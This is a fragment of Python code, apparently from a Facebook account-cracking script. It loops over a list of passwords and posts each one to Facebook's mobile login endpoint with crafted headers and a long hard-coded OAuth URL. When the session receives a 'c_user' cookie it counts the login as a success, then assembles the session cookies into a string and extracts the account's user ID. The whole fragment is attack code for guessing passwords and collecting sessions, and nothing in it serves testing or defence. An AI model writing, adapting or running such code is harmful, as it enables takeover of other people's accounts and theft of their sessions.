 ...
 try:
  for ps in pwv:
   ...
   header_freefb ={
    ...
    'x-requested-with': 'XMLHttpRequest',
    'x-response-format': 'JSONStream'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
   lo = session.post(' https://m.facebook.com/login/device-based/login/async/?api_key=2165289810464628&auth_token=1fd5f03c041475eeb3248f5b0b4a309c&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fclient_id%3D2165289810464628%26redirect_uri%3Dhttps%253A%252F%252Fapp.publer.io%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%26state%3D018e6632e2c1148ab77c649a6d192f6d8ec48093afa78344%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D282b82cb-a54b-440b-b99b-7c93e7efd162%26tp%3Dunspecified%26cbt%3D1710437767736&refsrc=deprecated&app_id=2165289810464628&cancel=https%3A%2F%2Fapp.publer.io%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D018e6632e2c1148ab77c649a6d192f6d8ec48093afa78344%23_%3D_&ht_token=Abtkb8RfKfUDlMeaY6xsznRJlqywTQ1_Qt1YXtvgqX4PgwyS&h_consent=1&ht_l=login&lwv=100',data=log_data,headers=header_freefb).text
   log_cookies=session.cookies.get_dict().keys()
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
